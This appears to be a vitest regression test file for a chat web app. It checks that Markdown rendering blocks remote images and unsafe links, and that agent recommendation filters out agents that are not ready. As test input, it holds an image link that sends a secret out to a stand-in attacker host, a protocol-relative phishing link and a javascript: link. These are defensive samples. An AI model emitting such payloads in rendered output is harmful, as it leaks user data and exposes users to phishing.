// 2026-11-26 全项目审查回归测试（网页端）：覆盖 Markdown 外链/图片防护、openExternal 协议校验、推荐就绪过滤与未知事件游标推进。
import { describe, expect, it, vi } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { createElement } from 'react';
import { RichText } from './components/Chat';
import { recommendAgent } from './lib/new-task';
import type { AgentInfo, Task } from '@aic/protocol';

describe('2026-11-26 网页审查回归', () => {
  it('ISSUE-0188：RichText 拦截远程 Markdown 图片自动请求，且非 http(s) 链接不渲染可点击 <a href>', () => {
    const md = [
      '![leak](https://attacker.example/steal?secret=1)',
      '[相对路径](/api/v1/hello)',
      '[伪造配对](#pair=123456)',
      '[协议相对](//evil.example/phish)',
      '[脚本](javascript:alert(1))',
      '[合法文档](https://example.com/docs)',
    ].join('\n\n');
    const html = renderToStaticMarkup(createElement(RichText, { text: md }));
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('已拦截外部图片：leak');
    expect(html).not.toContain('href="/api/v1/hello"');
    expect(html).not.toContain('href="#pair=123456"');
    expect(html).not.toContain('href="//evil.example/phish"');
    expect(html).not.toContain('javascript:');
    expect(html).toContain('href="https://example.com/docs"');
  });

  it('ISSUE-0188：recommendAgent 在无图分支只推荐 status === ready 的 Agent', () => {
    const agents: AgentInfo[] = [
      {
        kind: 'antigravity', displayName: 'Antigravity', status: 'needs_login', enabled: true,
        version: '1.5.18', verified: true, models: [], efforts: null, message: '未登录',
      },
    ];
    const tasks: Task[] = [
      {
        id: 't1', projectId: 'p1', groupId: null, title: '旧任务', prompt: '历史', agent: 'antigravity', model: null, effort: null,
        permission: 'ask', status: 'review', autoAllowLowRisk: false, autoMergeOnPass: false,
        createdAt: 1, updatedAt: 1, lastActivityAt: 10,
      },
    ];
    expect(recommendAgent('继续查数值', false, 'p1', agents, tasks)).toBeNull();
    expect(recommendAgent('继续查数值', false, 'p1', [{ ...agents[0]!, status: 'ready' }], tasks)).toMatchObject({ agent: 'antigravity' });
  });
});
